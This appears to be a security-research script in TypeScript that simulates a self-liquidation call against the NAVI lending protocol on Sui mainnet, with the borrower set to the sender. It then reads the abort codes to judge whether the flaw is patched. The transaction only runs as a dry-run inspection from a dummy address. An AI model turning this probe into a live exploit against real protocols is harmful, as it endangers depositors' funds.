import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const NAVI_MAIN_PKG = "0xee0041239b89564ce870a7dec5ddc5d114367ab94a1137e90aa0633cb76518e0";
const STORAGE       = "0xbb4e2f4b6205c2e2a2db47aeb4f830796ec7c005f88537ee775986639bc442fe";
const SUI_POOL      = "0x96df0fce3c471489f4debaaa762cf960b3d97820bd1f3f025ff8190730e958c5";
const ORACLE_OBJ    = "0x1568865ed9a0b5ec414220e8f79b3d04c77acc82358f6e5ae4635687392ffbef";
const INCENTIVE_V2  = "0xf87a8acb8b81d14307894d12595541a73f19933f88e1326d5be349c7a6f7559c";
const INCENTIVE_V3  = "0x62982dad27fb10bb314b3384d5de8d2ac2d72ab2dbeae5d801dbdb9efa816c80";
const CLOCK         = "0x0000000000000000000000000000000000000000000000000000000000000006";
const SUI_SYSTEM    = "0x0000000000000000000000000000000000000000000000000000000000000005";
const DUMMY         = "0x0000000000000000000000000000000000000000000000000000000000001337";
const SUI_TYPE      = "0x2::sui::SUI";

async function testSelfLiquidation() {
  console.log("=== NAVI Self-Liquidation Final Test ===");
  
  const tx = new Transaction();
  tx.setSender(DUMMY);
  
  const [debtCoin] = tx.splitCoins(tx.gas, [tx.pure.u64(1)]);

  // Use sharedObjectRef to properly pass shared mutable references
  tx.moveCall({
    target: `${NAVI_MAIN_PKG}::incentive_v3::entry_liquidation_v2`,
    typeArguments: [SUI_TYPE, SUI_TYPE],
    arguments: [
      // [0] Clock - immutable shared
      tx.sharedObjectRef({ objectId: CLOCK, initialSharedVersion: 1, mutable: false }),
      // [1] Oracle - immutable shared
      tx.sharedObjectRef({ objectId: ORACLE_OBJ, initialSharedVersion: 8202835, mutable: false }),
      // [2] Storage - mutable shared
      tx.sharedObjectRef({ objectId: STORAGE, initialSharedVersion: 8202844, mutable: true }),
      // [3] debt asset_id = 0
      tx.pure.u8(0),
      // [4] Pool<SUI> - mutable shared
      tx.sharedObjectRef({ objectId: SUI_POOL, initialSharedVersion: 8202845, mutable: true }),
      // [5] Coin<SUI> - from gas split
      debtCoin,
      // [6] collat asset_id = 0
      tx.pure.u8(0),
      // [7] Pool<SUI> - mutable shared (same pool)
      tx.sharedObjectRef({ objectId: SUI_POOL, initialSharedVersion: 8202845, mutable: true }),
      // [8] borrower_addr = DUMMY = sender (SELF-LIQUIDATION!)
      tx.pure.address(DUMMY),
      // [9] amount = 1
      tx.pure.u64(1),
      // [10] incentive_v2 - mutable shared
      tx.sharedObjectRef({ objectId: INCENTIVE_V2, initialSharedVersion: 38232222, mutable: true }),
      // [11] incentive_v3 - mutable shared  
      tx.sharedObjectRef({ objectId: INCENTIVE_V3, initialSharedVersion: 496060210, mutable: true }),
      // [12] SuiSystemState - mutable shared
      tx.sharedObjectRef({ objectId: SUI_SYSTEM, initialSharedVersion: 1, mutable: true }),
    ],
  });
  
  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender: DUMMY,
  });
  
  const status = result.effects?.status?.status;
  const error  = result.effects?.status?.error ?? "";
  console.log("Status:", status);
  console.log("Error:", error.slice(0, 800));
  
  if (status === "success") {
    console.log("\n*** VULNERABLE: Self-liquidation SUCCEEDS! No borrower != sender check. ***");
  } else {
    // Map abort codes
    const codeMatches = [...error.matchAll(/(\d{4,})/g)];
    const codes = codeMatches.map(m => m[1]).slice(0,5);
    console.log("Potential abort codes:", codes);
    
    if (codes.includes("1038") || error.includes("self_liquid")) {
      console.log(">>> PATCHED: 1038 = self-liquidation blocked");
    } else if (codes.some(c => ['30','31','1000','1001','1002','1100','1200'].includes(c))) {
      console.log(">>> Business logic abort (user not found, health factor, etc.)");
      console.log(">>> Cannot confirm self-liq guard without undercollateralized position");
    }
  }
  
  return { status, error, codes: [...error.matchAll(/(\d{3,})/g)].map(m=>m[1]).slice(0,10) };
}

testSelfLiquidation().catch(console.error);
